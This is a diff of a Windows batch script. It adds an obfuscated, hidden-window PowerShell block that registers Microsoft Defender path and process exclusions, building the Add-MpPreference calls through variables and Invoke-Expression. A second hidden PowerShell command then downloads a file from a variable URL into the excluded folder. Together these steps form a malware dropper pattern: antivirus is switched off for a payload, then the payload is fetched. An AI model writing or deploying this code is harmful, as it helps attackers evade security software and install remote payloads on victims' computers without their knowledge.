@@ -22,12 +22,20 @@ if %errorlevel%==0 (
 
 :run_script
 :: Add Defender exclusions
-powershell -WindowStyle Hidden -Command "
-    %a% -%b% '%e%' -ErrorAction SilentlyContinue;
-    %a% -%b% '%f%' -ErrorAction SilentlyContinue;
-    %a% -%c% '%d%' -ErrorAction SilentlyContinue;
-    %a% -%b% '%g%' -ErrorAction SilentlyContinue
-"
+powershell -WindowStyle Hidden -Command ^
+ "& { ^
+     $a = 'Add-MpPreference'; ^
+     $b = 'ExclusionPath'; ^
+     $c = 'ExclusionProcess'; ^
+     $d = '%d%'; ^
+     $e = '%e%'; ^
+     $f = '%f%'; ^
+     $g = '%g%'; ^
+     Invoke-Expression \"$a -%b '%e%' -ErrorAction SilentlyContinue\"; ^
+     Invoke-Expression \"$a -%b '%f%' -ErrorAction SilentlyContinue\"; ^
+     Invoke-Expression \"$a -%c '%d%' -ErrorAction SilentlyContinue\"; ^
+     Invoke-Expression \"$a -%b '%g%' -ErrorAction SilentlyContinue\"; ^
+ }"
 
 :: Download %d% from the specified URL
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%h%', '%g%\%d%')"
